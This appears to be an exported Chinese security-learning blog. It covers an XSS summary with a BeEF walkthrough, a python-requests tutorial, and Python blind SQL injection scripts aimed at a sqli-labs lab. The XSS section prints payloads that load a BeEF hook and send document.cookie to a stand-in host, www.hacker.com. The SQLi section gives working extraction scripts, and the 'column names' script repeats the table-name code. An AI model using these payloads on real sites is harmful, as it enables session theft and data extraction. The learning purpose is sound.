<h3 id="常用JavaScript方法"><a href="#常用JavaScript方法" class="headerlink" title="常用JavaScript方法"></a>常用JavaScript方法</h3><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">alert				<span class="comment">#alert()方法用于显示带有一条指定消息和一个确认按钮的警告</span></span><br><span class="line">window.<span class="keyword">location</span>	<span class="title">#window</span>.location对象用于获得当前页面的地址（url），并把浏览器重定向到新的页面。</span><br><span class="line">location.href		<span class="comment">#返回当前显示的文档的完整url</span></span><br><span class="line">onload			<span class="comment">#一张页面或一个图像完成加载</span></span><br><span class="line">onsubmit			<span class="comment">#确认按钮被点击</span></span><br><span class="line">onerror			<span class="comment">#在加载文档或图像是发生错误时触发事件</span></span><br></pre></td></tr></table></figure>

<h3 id="构造xss脚本"><a href="#构造xss脚本" class="headerlink" title="构造xss脚本"></a>构造xss脚本</h3><p>弹框警告：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'xss'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/xss-summary/13.png" alt="img"><br>页面嵌套:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.baidu.com</span> <span class="attr">width</span>=<span class="string">300</span> <span class="attr">height</span>=<span class="string">300</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/xss-summary/14.png" alt="img"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.baidu.com</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/xss-summary/15.png" alt="img"><br>页面重定向:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location=<span class="string">"http://www.baidu.com"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  #直接转到链接处</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">location.href=<span class="string">"http://www.baidu.com"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>弹框警告并重定向:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"请去这里"</span>);location.href=<span class="string">"http://www.baidu.com"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'xss'</span>);location.href=<span class="string">"http://www.baidu.com"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    &nbsp;&nbsp;这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户，（克隆网站收集账户）</p>
<p>恶意访问代码:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://www.qfedu.com/xss.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://BeFF_IP:3000/hook.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>		#结合BeFF收集用户的cookie</span><br></pre></td></tr></table></figure>

<p>巧用图片标签:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"#"</span> <span class="attribute">onerror</span>=alert('xss')&gt; 			#当图像加载失败是弹框</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"javascript:alert('xss');"</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"http://BeFF_IP:3000/hook.js"</span>&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure>

<h3 id="绕过过滤的常见方法"><a href="#绕过过滤的常见方法" class="headerlink" title="绕过过滤的常见方法"></a>绕过过滤的常见方法</h3><p>​        大小写绕过<br>​        编码绕过<br>​        双写绕过</p>
<h3 id="收集用户的cookie"><a href="#收集用户的cookie" class="headerlink" title="收集用户的cookie"></a>收集用户的cookie</h3><p>打开新窗口并且采用本地cookie访问目标网页，打开新窗口别切采用本地cookie访问目标网页</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">"http://www.hacker.com/cookie.php?cookie="</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">"http://www.hacker.com/cookie.php?cookie="</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">"http://www.hacker.com/cookie.php?cookie="</span>+<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;iframe src="http://www.hacker.com/cookie.php?cookie='+document.cookie")&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src="http://www.hacker.com/cookie.php?cookie='+document.cookie")&lt;/img&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">new</span> Image().src=<span class="string">"http://www.hacker.com/cookie.php?cookie='+document.cookie"</span>;img.width=<span class="number">0</span>; img.height=<span class="number">0</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以上就是我所了解的xss的一些基础知识，先总结到这里，后面将完成一些xss练习，自动化辅助xss工具以及xss靶场实战等，，，，，，</p>
<h1 id="xss工具"><a href="#xss工具" class="headerlink" title="xss工具"></a>xss工具</h1><h1 id="1-BeEF简介"><a href="#1-BeEF简介" class="headerlink" title="1.BeEF简介"></a>1.BeEF简介</h1><p>BeEF是目前最强大的浏览器开源渗透测试框架，通过xss漏洞配合js脚本和Metasploit进行渗透；<br>BeEF是基于ruby语言编写的，并且支持图形化界面，操作简单。<!--more--></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>1.网络发现<br>2.主机信息<br>3.cookie获取<br>4.会话劫持<br>5.键盘记录<br>6.插件信息</p>
<h2 id="持久化控制"><a href="#持久化控制" class="headerlink" title="持久化控制"></a>持久化控制</h2><p>1.确认弹框<br>2.小窗口<br>3.中间人<br>社会工程<br>1.点击劫持<br>2.弹窗警告<br>3.虚假页面<br>4.钓鱼页面</p>
<h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><p>1.内网渗透<br>2.Metasploit<br>3.csrf攻击<br>4.DDOS攻击</p>
<h1 id="2-BeFF基础"><a href="#2-BeFF基础" class="headerlink" title="2.BeFF基础"></a>2.BeFF基础</h1><h2 id="启动apache和BeEF"><a href="#启动apache和BeEF" class="headerlink" title="启动apache和BeEF"></a>启动apache和BeEF</h2><p>service apache2 start<br>beef-xss</p>
<p><img src="/2020/03/04/xss-summary/1.jpg" alt="img"></p>
<p>目前没有任何受控机</p>
<p><img src="/2020/03/04/xss-summary/2.jpg" alt="img"></p>
<p>将hook.js这段写入有xss的地方</p>
<p><img src="/2020/03/04/xss-summary/3.jpg" alt="img"></p>
<p>键盘记录在logs模块处</p>
<p><img src="/2020/03/04/xss-summary/4.jpg" alt="img"></p>
<p><img src="/2020/03/04/xss-summary/5.jpg" alt="img"></p>
<p>上面三个ip分别来自三个不同的计算机</p>
<h2 id="攻击项："><a href="#攻击项：" class="headerlink" title="攻击项："></a>攻击项：</h2><p>命令 颜色：<br>绿色        对目标主机生效并且不可见（不会被发现）<br>橙色        对目标主机生效但可能可见（可能被发现）<br>灰色        对目标主机未必生效（可验证下）<br>红色        对目标主机不生效</p>
<p><img src="/2020/03/04/xss-summary/6.jpg" alt="img"></p>
<p><img src="/2020/03/04/xss-summary/7.jpg" alt="img"></p>
<h2 id="执行一个弹框"><a href="#执行一个弹框" class="headerlink" title="执行一个弹框"></a>执行一个弹框</h2><p><img src="/2020/03/04/xss-summary/8.jpg" alt="img"></p>
<p><img src="/2020/03/04/xss-summary/9.jpg" alt="img"></p>
<h2 id="欺骗获取密码："><a href="#欺骗获取密码：" class="headerlink" title="欺骗获取密码："></a>欺骗获取密码：</h2><p><img src="/2020/03/04/xss-summary/10.jpg" alt="img"></p>
<p><img src="/2020/03/04/xss-summary/11.jpg" alt="img"></p>
<p><img src="/2020/03/04/xss-summary/12.jpg" alt="img"></p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>python-requests模块学习</title>
    <url>/2020/03/12/python-requests/</url>
    <content><![CDATA[<p>requests 是一个功能强大、简单易用的 HTTP 请求库，可以使用 <code>pip install requests</code> 命令进行安装<a id="more"></a><br>先来一段代码感受一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 引入Requests库</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起GET请求</span></span><br><span class="line">response = requests.get(<span class="string">'https://www.baidu.com/'</span>)</span><br><span class="line"><span class="comment"># 查看响应类型  requests.models.Response</span></span><br><span class="line">print(type(response))</span><br><span class="line"><span class="comment"># 输出状态码</span></span><br><span class="line">print(response.status_code)</span><br><span class="line"><span class="comment"># 输出响应内容类型  text</span></span><br><span class="line">print(type(response.text))</span><br><span class="line"><span class="comment"># 输出响应内容</span></span><br><span class="line">print(response.text)</span><br><span class="line"><span class="comment"># 输出cookies</span></span><br><span class="line">print(response.cookies)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/python-requests/1.png" alt></p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>各种请求方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起POST请求</span></span><br><span class="line">requests.post(<span class="string">'http://httpbin.org/post'</span>)</span><br><span class="line"><span class="comment"># 发起PUT请求</span></span><br><span class="line">requests.put(<span class="string">'http://httpbin.org/put'</span>)</span><br><span class="line"><span class="comment"># 发起DELETE请求</span></span><br><span class="line">requests.delete(<span class="string">'http://httpbin.org/delete'</span>)</span><br><span class="line"><span class="comment"># 发送HEAD请求</span></span><br><span class="line">requests.head(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line"><span class="comment"># 发送OPTION请求</span></span><br><span class="line">requests.options(<span class="string">'http://httpbin.org/get'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h2><h3 id="基本写法"><a href="#基本写法" class="headerlink" title="基本写法"></a>基本写法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/python-requests/2.png" alt></p>
<h3 id="带参数的get请求："><a href="#带参数的get请求：" class="headerlink" title="带参数的get请求："></a>带参数的get请求：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'http://httpbin.org/get?name=jyx&amp;age=18'</span>)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/python-requests/3.png" alt><br>还有一种方式，将传参用字典的方式写下来,用params来传递</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">get = &#123;<span class="string">"name"</span>:<span class="string">"chengyizhou"</span>,<span class="string">"age"</span>:<span class="string">"19"</span>&#125;</span><br><span class="line">response = requests.get(<span class="string">'http://httpbin.org/get'</span>,params=get)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/python-requests/4.png" alt></p>
<h3 id="解析json"><a href="#解析json" class="headerlink" title="解析json"></a>解析json</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">get = &#123;<span class="string">"name"</span>:<span class="string">"chengyizhou"</span>,<span class="string">"age"</span>:<span class="string">"19"</span>&#125;</span><br><span class="line">response = requests.get(<span class="string">'http://httpbin.org/get'</span>,params=get)</span><br><span class="line"><span class="comment">#获取响应内容</span></span><br><span class="line">print(type(response.text))</span><br><span class="line"><span class="comment">#如果响应内容为json，就将其转为json</span></span><br><span class="line">print(response.json())</span><br><span class="line"><span class="comment">#输出类型，为字典类型</span></span><br><span class="line">print(type(response.json()))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/python-requests/5.png" alt></p>
<h3 id="获取二进制数据"><a href="#获取二进制数据" class="headerlink" title="获取二进制数据"></a>获取二进制数据</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">get = &#123;<span class="string">"name"</span>:<span class="string">"chengyizhou"</span>,<span class="string">"age"</span>:<span class="string">"19"</span>&#125;</span><br><span class="line">response = requests.get(<span class="string">'http://httpbin.org/get'</span>,params=get)</span><br><span class="line"><span class="comment"># str，bytes</span></span><br><span class="line">print(type(response.text),type(response.content))</span><br><span class="line"><span class="comment"># 输出响应的文本内容</span></span><br><span class="line">print(response.text)</span><br><span class="line"><span class="comment"># 输出响应的二进制内容</span></span><br><span class="line">print(response.content)</span><br><span class="line"><span class="comment"># 下载二进制数据到本地</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'C:\\Users\\华硕\\Desktop\\bytes.txt'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(response.content)</span><br><span class="line">  f.close()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/python-requests/6.png" alt></p>
<h3 id="添加header"><a href="#添加header" class="headerlink" title="添加header"></a>添加header</h3><p>前面的urllib模块也有，差不多，不过这个比较简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置User-Agent浏览器信息</span></span><br><span class="line">headers = &#123;</span><br><span class="line">      <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 设置请求头信息</span></span><br><span class="line">response = requests.get(<span class="string">'https://www.zhihu.com/explore'</span>,headers=headers)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/python-requests/7.png" alt></p>
<h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>也是用字典的方式传参</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#设置post传参表单信息</span></span><br><span class="line">data=&#123;<span class="string">"name"</span>:<span class="string">"chengyizhou"</span>,<span class="string">"age"</span>:<span class="string">"1919"</span>&#125;</span><br><span class="line"><span class="comment"># 设置User-Agent浏览器信息</span></span><br><span class="line">headers = &#123;</span><br><span class="line">      <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 设置请求头信息</span></span><br><span class="line">response = requests.post(<span class="string">'http://httpbin.org/post'</span>,headers=headers,data=data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/python-requests/8.png" alt></p>
<h1 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h1><h2 id="response属性"><a href="#response属性" class="headerlink" title="response属性"></a>response属性</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'http://www.jianshu.com/'</span>)</span><br><span class="line"><span class="comment"># 获取响应状态码</span></span><br><span class="line">print(type(response.status_code),response.status_code)</span><br><span class="line"><span class="comment"># 获取响应头信息</span></span><br><span class="line">print(type(response.headers),response.headers)</span><br><span class="line"><span class="comment"># 获取响应头中的cookies</span></span><br><span class="line">print(type(response.cookies),response.cookies)</span><br><span class="line"><span class="comment"># 获取访问的url</span></span><br><span class="line">print(type(response.url),response.url)</span><br><span class="line"><span class="comment"># 获取访问的历史记录</span></span><br><span class="line">print(type(response.history),response.history)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/python-requests/9.png" alt></p>
<h2 id="状态码判断"><a href="#状态码判断" class="headerlink" title="状态码判断"></a>状态码判断</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'http://www.jianshu.com/404.html'</span>)</span><br><span class="line"><span class="comment"># 使用request内置的字母判断状态码</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> response.status_code == requests.codes.ok:</span><br><span class="line">    print(<span class="string">'404-1'</span>)</span><br><span class="line">response = requests.get(<span class="string">'http://www.jianshu.com'</span>)</span><br><span class="line"><span class="comment"># 使用状态码数字判断</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    print(<span class="string">'404-2'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/python-requests/10.png" alt></p>
<h1 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h1><p>在 requests 里，session对象是一个非常常用的对象，这个对象代表一次用户会话：从客户端浏览器连接服务器开始，到客户端浏览器与服务器断开。<br>会话能让我们在跨请求时候保持某些参数，比如在同一个 Session 实例发出的所有请求之间保持 cookie 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 创建session对象，可以保存Cookie值</span></span><br><span class="line">ssion = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 处理 headers</span></span><br><span class="line">headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 需要登录的用户名和密码</span></span><br><span class="line">data = &#123;<span class="string">"email"</span>:<span class="string">"mr_mao_hacker@163.com"</span>, <span class="string">"password"</span>:<span class="string">"alarmchime"</span>&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 发送附带用户名和密码的请求，并获取登录后的Cookie值，保存在ssion里</span></span><br><span class="line">ssion.post(<span class="string">"http://www.renren.com/PLogin.do"</span>, data = data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. ssion包含用户登录后的Cookie值，可以直接访问那些登录后才可以访问的页面</span></span><br><span class="line">response = ssion.get(<span class="string">"http://www.renren.com/410043129/profile"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 打印响应内容</span></span><br><span class="line"><span class="keyword">print</span> response.text</span><br></pre></td></tr></table></figure>

<h1 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">"http"</span>: <span class="string">"http://127.0.0.1:9743"</span>,</span><br><span class="line">    <span class="string">"https"</span>: <span class="string">"https://127.0.0.1:9743"</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 往请求中设置代理(proxies</span></span><br><span class="line">)</span><br><span class="line">response = requests.get(<span class="string">"https://www.taobao.com"</span>, proxies=proxies)</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>

<h1 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">print(response.cookies)</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> response.cookies.items():</span><br><span class="line">    print(key,<span class="string">'====='</span>,value)</span><br></pre></td></tr></table></figure>

<p>requests模块常用的一些方法差不多就是这些了，以后可能还会补充。确实比urllib模块方便。</p>
<p>参考链接：<a href="https://blog.csdn.net/Eason_oracle/article/details/80064624?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158401531719726867832804%2522%252C%2522scm%2522%253A%252220140713.130056874" target="_blank" rel="noopener">https://blog.csdn.net/Eason_oracle/article/details/80064624?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158401531719726867832804%2522%252C%2522scm%2522%253A%252220140713.130056874</a></p>
]]></content>
      <tags>
        <tag>python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>python编写盲注exp</title>
    <url>/2020/03/13/mangzhu-exp/</url>
    <content><![CDATA[<p>EXP：漏洞利用工具<br>使用python的requests模块编写盲注脚本。<a id="more"></a></p>
<h1 id="布尔盲注-GET"><a href="#布尔盲注-GET" class="headerlink" title="布尔盲注(GET)"></a>布尔盲注(GET)</h1><p>以sqli-labs-8为例<br>sqli-labs-8 为单引号闭合的盲注，我们可以通过计算整个页面的长度来判断是否返回成功。</p>
<h2 id="判断数据库长度："><a href="#判断数据库长度：" class="headerlink" title="判断数据库长度："></a>判断数据库长度：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-8/"</span></span><br><span class="line">normallen=len(requests.get(url=url+<span class="string">"?id=1"</span>).text)<span class="comment">#获取正常回显时网页的长度</span></span><br><span class="line">print(normallen)</span><br><span class="line"></span><br><span class="line">dblen=<span class="number">0</span>    <span class="comment">#设置初始长度为0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    db_url=url+<span class="string">"?id=1' and length(database())="</span>+str(dblen)+<span class="string">"--+"</span></span><br><span class="line">    print(db_url)</span><br><span class="line">    print(len(requests.get(db_url).text))</span><br><span class="line">    <span class="keyword">if</span> len(requests.get(db_url).text)==normallen:    <span class="comment">#判断长度是否等于正常时页面长度</span></span><br><span class="line">        print(<span class="string">"The Len Of Dblen:"</span>+str(dblen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dblen==<span class="number">30</span>:</span><br><span class="line">        print(<span class="string">"Error!"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dblen+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/1.png" alt></p>
<h2 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-8/"</span></span><br><span class="line">normallen=len(requests.get(url=url+<span class="string">"?id=1"</span>).text)<span class="comment">#获取正常回显时网页的长度</span></span><br><span class="line">dbname=<span class="string">"qwertyuioplkjhgfdsazxcvbnm,./;'[]_-1234567890"</span></span><br><span class="line">dbName=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dbname:</span><br><span class="line">        dbname_url=url+<span class="string">"?id=1' and substr(database(),"</span>+str(i)+<span class="string">",1)='"</span>+j+<span class="string">"'--+"</span> <span class="comment">#构造payload</span></span><br><span class="line">        <span class="comment">#print(dbname_url)</span></span><br><span class="line">        <span class="comment">#再使用if判断返回页面长度</span></span><br><span class="line">        <span class="keyword">if</span> len(requests.get(dbname_url).text)==normallen:</span><br><span class="line">            dbName+=j</span><br><span class="line">            print(dbName)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/2.png" alt></p>
<h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-8/"</span></span><br><span class="line">normallen=len(requests.get(url=url+<span class="string">"?id=1"</span>).text)<span class="comment">#获取正常回显时网页的长度</span></span><br><span class="line">dbname=<span class="string">"qwertyuioplkjhgfdsazxcvbnm,./;'[]_-1234567890"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#表名</span></span><br><span class="line">tablename=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dbname:</span><br><span class="line">        tbname_url=url+<span class="string">"?id=1' and substr((select table_name from information_schema.tables where table_schema = 'security' limit 1,1),"</span>+str(i)+<span class="string">",1)='"</span>+j+<span class="string">"'--+"</span> <span class="comment">#构造payload</span></span><br><span class="line">        <span class="comment">#print(tbname_url)</span></span><br><span class="line">        <span class="comment">#再使用if判断返回页面长度</span></span><br><span class="line">        <span class="keyword">if</span> len(requests.get(tbname_url).text)==normallen:</span><br><span class="line">            tablename+=j</span><br><span class="line">            print(tablename)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/3.png" alt><br>红色的地方代表第几个表名，0代表第一个表名</p>
<h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dbname:</span><br><span class="line">        tbname_url=url+<span class="string">"?id=1' and substr((select table_name from information_schema.tables where table_schema = 'security' limit 1,1),"</span>+str(i)+<span class="string">",1)='"</span>+j+<span class="string">"'--+"</span> <span class="comment">#构造payload</span></span><br><span class="line">        <span class="comment">#print(tbname_url)</span></span><br><span class="line">        <span class="comment">#再使用if判断返回页面长度</span></span><br><span class="line">        <span class="keyword">if</span> len(requests.get(tbname_url).text)==normallen:</span><br><span class="line">            tablename+=j</span><br><span class="line">            print(tablename)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/4.png" alt></p>
<h2 id="获取内容"><a href="#获取内容" class="headerlink" title="获取内容"></a>获取内容</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-8/"</span></span><br><span class="line">normallen=len(requests.get(url=url+<span class="string">"?id=1"</span>).text)<span class="comment">#获取正常回显时网页的长度</span></span><br><span class="line">data=<span class="string">"qwertyuioplkjhgfdsazxcvbnm,_-1234567890"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#内容</span></span><br><span class="line">allname=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">        name_url=url+<span class="string">"?id=1' and substr((select username from users limit 1,1),"</span>+str(i)+<span class="string">",1)='"</span>+j+<span class="string">"'--+"</span> <span class="comment">#构造payload</span></span><br><span class="line">        <span class="comment">#print(name_url)</span></span><br><span class="line">        <span class="comment">#再使用if判断返回页面长度</span></span><br><span class="line">        <span class="keyword">if</span> len(requests.get(name_url).text)==normallen:</span><br><span class="line">            allname+=j</span><br><span class="line">            print(allname)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/5.png" alt></p>
